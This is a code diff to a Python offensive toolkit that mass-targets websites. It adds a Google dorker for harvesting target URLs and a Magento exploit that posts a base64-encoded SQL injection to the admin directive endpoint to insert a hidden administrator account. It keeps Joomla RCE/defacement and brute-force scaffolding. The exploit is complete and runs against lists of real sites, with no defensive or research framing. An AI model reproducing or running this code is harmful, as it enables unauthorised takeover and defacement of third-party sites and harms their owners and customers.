@@ -12,9 +12,10 @@
 ###     You should have received a copy of the GNU General Public License     ###
 ###     along with this program.  If not, see <http://www.gnu.org/licenses/>  ###
 #################################################################################
-import requests,json,sys, time, re, os
+import requests,json,sys, time, re, os, base64, random
 from time import gmtime, strftime
 from optparse import OptionParser
+from urlparse import parse_qs, urlparse
 
 __author__     = 'Black Eye'
 __bitbucket__  = 'https://bitbucket.org/darkeye/'
@@ -40,8 +41,10 @@ def __help__():
 	print "\t\t+ Joomla Rce                    :   rce_joomla"
 	print "\t\t+ Google Dorker                 :   google_dorker"
 	print "\t\t+ update Database (sudo needed) :   -u/--update"
+
 def __update__():
 	pass
+
 class color:
 	P    =  '\033[95m' # purple
 	B    =  '\033[94m' # Blue
@@ -54,27 +57,88 @@ class color:
 	M    =  '\033[95m' # Magenta
 	C    =  '\033[96m' # Cyan
 	ENDC =  '\033[0m'  # end colors
+####################################
+##                                ##
+##        GOOGLE DORKER           ##
+##                                ##
+####################################
+class google:
+	url = []
+	def random(self):
+		tld = [
+		'ae', 'am', 'as', 'at',
+		'az', 'ba', 'be', 'bg',
+		'bi', 'bs', 'ca', 'cd',
+		'cg', 'ch', 'ci', 'cl',
+		'co.bw', 'co.ck', 'co.cr', 'co.hu',
+		'co.id', 'co.il', 'co.im', 'co.in',
+		'co.je', 'co.jp', 'co.ke', 'co.kr',
+		'co.ls', 'co.ma', 'co.nz', 'co.th',
+		'co.ug', 'co.uk', 'co.uz', 'co.ve',
+		'co.vi', 'co.za', 'co.zm', 'com',
+		'com.af', 'com.ag', 'com.ar', 'com.au',
+		'com.bd', 'com.bo', 'com.br', 'com.bz',
+		'com.co', 'com.cu', 'com.do', 'com.ec',
+		'com.eg', 'com.et', 'com.fj', 'com.gi',
+		'com.gt', 'com.hk', 'com.jm', 'com.kw',
+		'com.ly', 'com.mt', 'com.mx', 'com.my',
+		'com.na', 'com.nf', 'com.ni', 'com.np',
+		'com.om', 'com.pa', 'com.pe', 'com.ph',
+		'com.pk', 'com.pr', 'com.py', 'com.qa',
+		'com.sa', 'com.sb', 'com.sg', 'com.sv',
+		'com.tj', 'com.tr', 'com.tw', 'com.ua',
+		'com.uy', 'com.uz', 'com.vc', 'com.vn',
+		'cz', 'de', 'dj', 'dk',
+		'dm', 'ee', 'es', 'fi',
+		'fm', 'fr', 'gg', 'gl',
+		'gm', 'gr', 'hn', 'hr',
+		'ht', 'hu', 'ie', 'is',
+		'it', 'jo', 'kg', 'kz',
+		'li', 'lk', 'lt', 'lu',
+		'lv', 'md', 'mn', 'ms',
+		'mu', 'mw', 'net','nl',
+		'no', 'nr', 'nu', 'pl',
+		'pn', 'pt', 'ro', 'ru',
+		'rw', 'sc', 'se', 'sh',
+		'si', 'sk', 'sm', 'sn',
+		'tm', 'to', 'tp', 'tt',
+		'uz', 'vg', 'vu', 'ws']
+		tld_rand = random.sample(tld, 1)
+		for tldd in tld_rand:
+			return tldd
+	def __init__(self, dork, start, stop):
+		tld = self.random()
+		def google_search():
+			google = "https://www.google."+tld+"/search?q="+dork+"&start="+str(start)
+			return google
+		def get_url(url):
+			html = requests.get(url).content
+			k = re.findall(r'<h3 class="r"><a href="(.*?)"', html)
+			for s in k:
+				s=s.strip()
+				if s.startswith('/url?'):
+					o = urlparse(s, 'http')
+					link = parse_qs(o.query)['q'][0]
+					self.url.append(link)
+					ope = open("url.txt", "a")
+					ope.write(link+"\n")
+					ope.close
+		def search_url(start, stop):
+			while start<stop:
+				google_start = "https://www.google."+tld+"/search?q="+dork+"&start="+str(start)
+				start+=10
+				get_url(google_start)
+			print color.G+color.BOLD+"[+]"+color.BOLD+color.W+" "+str(len(self.url))+" FOUND"
+		print color.G+color.BOLD+"[+]"+color.BOLD+color.W+" GOOLGE TLD    :  ."+tld
+		print color.G+color.BOLD+"[+]"+color.BOLD+color.W+" SEARCH URL    :  "+google_search()
+		print color.G+color.BOLD+"[+]"+color.BOLD+color.W+" DORK          :  "+dork
+		search_url(start, stop)
 
-class dorker():
-	def google(self, dork, page, ssl):
-		from google import search
-		search = search(dork,start=0, stop=page)
-		non_ssl_s, ssl_s = [], []
-		for url in search:
-			if "https:" in url:
-				ssl_s.append(url)
-			if "http:" in url:
-				non_ssl_s.append(url)
-		if ssl==True:
-			print color.BOLD+color.W+"[+] "+color.R+str(len(ssl_s))+color.W+" Found !"+color.ENDC
-			for s in ssl_s:
-				print s
-		if ssl==False:
-			print color.BOLD+color.W+"[+] "+color.R+str(len(non_ssl_s))+color.W+" Found !"+color.ENDC
-			for k in non_ssl_s:
-				print k
-	def __init__(self):
-		pass
+####################################
+##                                ##
+##   BruteForcing WP/JM/FTP/SSH   ##
+##                                ##
+####################################
 
 class BruteForce:
 	def wordpress(self, url, username,wordlist):
@@ -117,6 +181,12 @@ class BruteForce:
 	def joomla(self, url, wordlist):
 		pass
 
+
+####################################
+##                                ##
+##    Add RCE joomla & Magento    ##
+##                                ##
+####################################
 class rce:
 	def joomla(self, wordlist):
 		wordlist = open(wordlist, "r")
@@ -153,10 +223,40 @@ class rce:
 				z.close()
 			else:
 				print i+" : Not Defaced"
-			#wordlist.close()
-	def magento(self):
-		pass
+		wordlist.close()
 
+
+	def magento(self, wordlist):
+		wordlist = open(wordlist, "r")
+		for site in wordlist.readlines():
+			site = site.strip()
+			target_url = site + "/admin/Cms_Wysiwyg/directive/index/"
+			if not target_url.startswith("http"):
+				target_url = "http://" + target_url
+			if target_url.endswith("/"):
+				target_url = target_url[:-1]
+			q="""
+			SET @SALT = 'rp';
+			SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
+			SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
+			INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
+			INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');"""
+			query = q.replace("\n", "").format(username="black", password="black")
+			pfilter = "popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{0}".format(query)
+			# e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ decoded is{{block type=Adminhtml/report_search_grid output=getCsvFile}}
+			r = requests.post(target_url,
+				data={"___directive": "e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ",
+				"filter": base64.b64encode(pfilter),
+				"forwarded": 1})
+			if r.ok:
+				print "{0}/admin with login : admin:admin".format(target_url)
+			else:
+				print "NOT WORKED with {0}".format(target_url)
+####################################
+##                                ##
+##      Get Website from IP       ##
+##                                ##
+####################################
 class dnsinfo:
 	def checkhost(self, url):
 		get = requests.get(url).status_code
@@ -190,15 +290,7 @@ class dnsinfo:
 			print color.W+color.BOLD+"Domains is saved in "+ipp+".txt"+color.ENDC
 		details = Details()
 		rzlt(details)
-	def viewdns(self, ip):
-		viewdns = 'http://viewdns.info/reverseip/?host='
-		dns = viewdns+ip+"&t=1"
-		get = requests.get(dns)
-		get = get.text
-		black =re.findall(r"<td>(.*?)</td><td align=", get)
-		for i in black:
-			i=i.strip().lower()
-			print i
+
 def __main__():
 	__banner__()
 	for arg in sys.argv:
@@ -233,16 +325,11 @@ def __main__():
 			parser = OptionParser()
 			parser.add_option("--ip",
 				help="Parse IP address")
-			parser.add_option("--viewdns","-v",
-				help="Get website from viewdns",action="store_true")
 			parser.add_option("--yougetsignal","-y",
 				help="Get website from yougetsignal",action="store_true")
 			(options,args) = parser.parse_args()
 			ip = options.ip
-			viewdns = options.viewdns
 			yougetsignal = options.yougetsignal
-			if ip and viewdns==True:
-				dnsinfo().viewdns(ip)
 			if ip and yougetsignal==True:
 				dnsinfo().yougetsignal(ip)
 		if (arg=="rce_joomla"):
@@ -253,27 +340,34 @@ def __main__():
 			wordlist = options.wordlist
 			if wordlist:
 				rce().joomla(wordlist)
+		if (arg=="rce_magento"):
+			parser = OptionParser()
+			parser.add_option("--wordlist","-w",
+				help="Wordlist path")
+			(options,args) = parser.parse_args()
+			wordlist = options.wordlist
+			if wordlist:
+				rce().magento(wordlist)
 		if (arg=="google_dorker"):
 			parser = OptionParser()
 			parser.add_option("--dork","-d",
 				help="Dork for get URL")
-			parser.add_option("--page","-p", metavar="NUMBER", type=int, default=0,
+			parser.add_option("--start", metavar="NUMBER", type=int, default=0,
 				help="Number of page")
-			parser.add_option("--ssl",
-				help="Get HTTPS(SSL) Website",action="store_true")
-			parser.add_option("--no-ssl",
-				help="Get HTTP Website",action="store_true")
+			parser.add_option("--stop", metavar="NUMBER", type=int, default=0,
+				help="Number of page")
+			#parser.add_option("--ssl",
+			#	help="Get HTTPS(SSL) Website",action="store_true")
+			#parser.add_option("--no-ssl",
+			#	help="Get HTTP Website",action="store_true")
 			(options,args) = parser.parse_args()
 			dork = options.dork
-			page = options.page
-			ssl  = options.ssl
-			no_ssl = options.no_ssl
-			if dork and page and ssl==True:
-				print color.BOLD+color.W+"[+] Grab SSL Website from Google With dork : "+dork+color.ENDC
-				dorker().google(dork, page, ssl=True)
-			if dork and page and no_ssl==True:
-				print color.BOLD+color.W+"[+] Grab NO SSL Website from Google With dork : "+dork+color.ENDC
-				dorker().google(dork, page, ssl=False)
+			start = options.start
+			stop = options.stop
+			#ssl  = options.ssl
+			#no_ssl = options.no_ssl
+			#if dork and stop and start:
+			google(dork, start, stop)
 
 		if (arg=="-u" or arg=="--update"):
 			__update__()
